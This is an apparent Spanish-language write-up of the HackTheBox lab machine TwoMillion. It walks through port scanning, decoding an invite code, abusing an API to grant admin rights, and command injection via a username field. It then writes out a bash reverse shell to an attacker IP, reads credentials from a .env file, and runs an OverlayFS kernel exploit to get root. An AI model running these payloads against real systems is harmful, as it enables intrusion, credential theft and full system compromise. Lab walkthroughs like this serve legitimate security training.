| Campo | Valor |
| --- | --- |
| **Máquina** | HackTheBox: TwoMillion |
| **Enlace** | https://www.hackthebox.com/machines/twomillion |
| **Modo de red** | Bridged |
| **Virtualización** | VMware (Kali) · VPN (HackTheBox) |

## Recopilación de Información

Primero que nada identificamos que tipo de sistemas operativo estamos enfrentando, adicionalmente confirmamos si la maquina esta activa.

	ping -c 1 10.10.14.67

![[Pasted image 20241022020349.png]]

> [!NOTE] TTL
> El valor del TTL puede ayudarte a inferir si un sistema operativo es Windows o Linux, aunque no es una regla absoluta.
> - **Windows**: Tipicamente, los sistemas windows utilizan un TTL inicial de 128.
> - **Linux**: Generalmente, los sistemas Linux utilizan un TTL inicial de 64.
> ```
> Linux (TTL -> 64) | Windows (TTL -> 128)
> ```

Ahora haremos un scan con nmap y le decimos que todos los resultados se guarden para un formato grepeable..

	nmap 10.10.11.221 -p- --open -sS --min-rate=5000 -vvv -n -Pn -oG allPorts

![[Pasted image 20241022024151.png]]

Ahora que ya manejamos que puertos exlusivos son los que estan abiertos, haremos un escaneo mas exhaustivo.

	nmap 10.10.11.221 -p 22,80 -sCV -oN targeted

![[Pasted image 20241022024827.png]]

Podemos notar que a pesar de que en el puerto 80 no obtuvimos la versión sabemos que nos hace una redirección a `http://2million.htb`. Comprobemos si tenemos acceso.

![[Pasted image 20241022025005.png]]

Entonces lo que haremos será apuntar la IP a esa dirección en nuestro archivo `/etc/hosts` y probemos de nuevo

![[Pasted image 20241022025154.png]]

Entramos a la pagina y conseguimos información.

![[Pasted image 20241022044712.png]]

De primera mano, antes de irnos por los platos mas fuerte como el login, verifiquemos el `join`.

![[Pasted image 20241022044922.png]]

Revisando el inspecto de elementos no encontramos nada, asi que como ultimo movimiento y usaremos el comando `this` en la consola de comandos, ya que sirve para obtener referencias al contexto actual en el que se encuentra la web.

	this

![[Pasted image 20241022045052.png]]

Observamos que existe una funcion llamada `makeInvitationCode`, asi que la mandaremos a llamar para ver que pasa.

![[Pasted image 20241022045143.png]]

Hemos encontrado un mensaje secreto!. Adicionalmente ya nos están compartiendo el método de encriptación asi que vamos a ello.

> [!example] ROT13
> Ya que ocupa un método de encriptación ROT13 que consiste en mover la letra del abecedario 13 espacios y reemplazar esa letra, lo haremos desde la consola con el siguiente comando.
> 
> `echo 'mensaje_encryptado' | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`


![[Pasted image 20241022045601.png]]
## Enumeración de End_Point

Ahora que sabemos que estamos llamando a una API haremos uso del comando `curl`.

	curl -s -x POST "address" | jq

![[Pasted image 20241022045814.png]]

Ahora, obtenemos un codigo con apariencia de un `base64` debido al `=`, asi que toca hay que probar.

	echo 'CODE' | base64 -d; echo

![[Pasted image 20241022050009.png]]

Probamos en la pagina.

![[Pasted image 20241022050032.png]]

Y efectivamente funciona.

![[Pasted image 20241022050053.png]]

Nos registramos y entramos a la pagina.

![[Pasted image 20241022050305.png]]

Ahora, navegando dentro de la pagina, en la seccion de `Labs > Access` encontramos otra API.

![[Pasted image 20241022050625.png]]

Perteneciente al boton `Connection Pack` que apunta a `http://2million.htb/api/v1/user/vpn/generate`, asi que haremos sera enumera los end_point existentes

	curl -s -X GET LINK_ADDRESS/api/v1 -H "Cookie: PHPSESSID=askuhvbdasukhdbsa" | jq

![[Pasted image 20241022051051.png]]

> [!WARNING] Tener en cuenta de que si no funciona, usar el comando `-v` para poder activar el verbose y ver si no es una cuestion de autentificacion que requiera la cookie, etc.
## Explotación

Ahora que tenemos todos los end_point, notamos que tenemos una seccion de `admin`. Dentro de estos vemos que existe un metodo `PUT`, veamos que podemos obtener de este.

![[Pasted image 20241022051630.png]]

Como podemos observar, nos devuelve un mensaje indicandonos que el tipo de contenido es invalido, y es debido a que estamos solicitando que nos devuelva un json, asi que solo hay que especificarlo con:

	-H "Content-Type: application/json"

![[Pasted image 20241022051847.png]]

Ahora, agregaremos el parámetro faltante que nos pide.

	-d '{"email": s1or@s1or.com}'

![[Pasted image 20241022052042.png]]

Agregamos el parametro faltante que nos pide:

	-d '{"email": "s1or@s1or.com", "is_admin": "True"}'

![[Pasted image 20241022052248.png]]

Hacemos la corrección

![[Pasted image 20241022052333.png]]

Ahora con las end_point que recolectamos anteriormente validamos si nuestro usuario es Administrador

![[Pasted image 20241022052456.png]]

Ahora, haciendo memoria tambien dentro de la seccion de admin podiamos generar una VPN, asi que vamos a ello:

![[Pasted image 20241022052611.png]]

Y repetimos el proceso.

![[Pasted image 20241022052733.png]]

Ahora vemos que la respuesta no esta en JSON, asi que borramos el `| jq`

![[Pasted image 20241022052814.png]]

> [!WARNING] Importante
> Algo importante que debemos dejar claro, es que en algunos sistemas vulnerables, como en este caso, toman el valor que nos piden(en este caso el usuario) y en base a ello crean lo que sea que te estén dando (en este caso una vpn).
> 
> Es decir, es posible que detrás, del lado del servidor se este ejecutando una serie de comandos donde por ejemplo, se ejecute lo siguiente:
> 
> ```
> comando -s -a {user} -a -b
> ```
> 
> El problema de esto, es que si se esta realizando de esta manera, podemos integrar comando dentro del parámetro solicitado y obtener una respuesta del lado del servidor.

Asi que probemos si este es el caso:

	curl -s -X POST 'ADDRESS' -H 'Cookie: PHPSESSID=asdasdasdasdsa' -H 'Content-Type: application/json' -d {"username": "s1or; whoami #"}

+ Agregamos un `;` para separar el comando
+ Agregamos un `#` para comentar lo que sigue por si hay mas comando que se están ejecutando

![[Pasted image 20241022053740.png]]

Y tenemos capacidad de ejecución remota.

![[Pasted image 20241022053858.png]]

Ahora ganaremos acceso al sistema para realizar una reverse shell con el siguiente comando:

	bash -c \"bash -i >& /dev/tcp/10.10.14.67/443 0>&1\";"
	nc -nlvp 443

![[Pasted image 20241022054439.png]]

> [!TIP] Tratamiento de consola en una reverse shell
> Lo que haremos será aplicación un tratamiento a la consola con los siguientes pasos
> 
> 	script /dev/null -c bash
> 
> Ahora que hemos lanzado una seudo-consola, comenzamos con el tratamiento:
> 
> 1. Hacemos `Ctrl + Z`
> 
> Luego escribimos:
> 
> 	stty raw -echo; fg
> 	reset xterm
> 	export TERM=xterm
> 
> > [!WARNING] Y en dado caso que no tenga una bash
> > Aplicar el siguiente comando:
> > 
> > 	export SHELL=bash

Ejecutamos un `ls -la` para comprobar el contenido.

![[Pasted image 20241022060027.png]]

Revisamos el `Database.php`

![[Pasted image 20241022060104.png]]

Observamos de primera mano que esta usando variables de entorno donde aloja la informacion, pero para nuestra suerte cuando listamos tambien se encontraba un archivo llamado `.env`, asi que hechemosle un ojo.

![[Pasted image 20241022060210.png]]

Vemos que estan las credenciales asi que probemos si logramos escalar privilegios en la maquina.

![[Pasted image 20241022060326.png]]

Ahora por simple comodidad aprovechando el hecho de que sabemos que el puerto 22 esta activo, nos conectamos por tal

![[Pasted image 20241022060511.png]]

> [!Example] OJO
> 
> Desde entrada tenemos un texto interesante:
> 
> ![[Pasted image 20241022060607.png]]
> Los mail en los sistemas linux se llegan a alojar en la ruta `/var/mail/`

Vayamos a ver que nos encontramos.

![[Pasted image 20241022060747.png]]

Otra manera de encontrar la ruta como tal, es realizando busquedas de que carpetas o directorios el usuario admin tiene permisos.

	find / -user admin 2>/dev/null | grep -vE "sys|proc"

![[Pasted image 20241022061849.png]]

> [!Info] 
> Algo curioso es que mientras navegabamos, dentro de la reversehll encontramos una de las la flag.txt 😆
> 
> ![[Pasted image 20241022061043.png]]
> 
## Post - Explotación/Escalación de privilegios

Ahora, ya que tenemos acceso conseguimos todo tipo de información de la maquina.

![[Pasted image 20241022061408.png]]

Realizando un poco de investigación de las versiones en las que se encuentra la maquina, nos topamos con esto:

![[Pasted image 20241022061517.png]]

Para tener mas credibilidad, recordemos que en el correo también hace mención de una vulnerabilidad OverlayFS. Asi que vemos dentro de la web.

![[Pasted image 20241022062223.png]]

Ahora buscamos un repo de github.

![[Pasted image 20241022062417.png]]

Vemos que coincide con la información que obtuvimos con anterioridad. Asi que probemos la herramienta.

+ Clonamos el repositorio
+ Lo comprimimos de manera recursiva con `zip comprimir.zip -r NAME_CARPETA`
+ Y levantamos un servidor con python `python3 -m http.server 80`

![[Pasted image 20241022062919.png]]

Ahora seguimos las instrucciones del github para ejecutar.

	make all

![[Pasted image 20241022063040.png]]

Ahora ejecuto `./exp` desde otra terminal

![[Pasted image 20241022063339.png]]

Y listo, somo root.

![[Pasted image 20241022063410.png]]
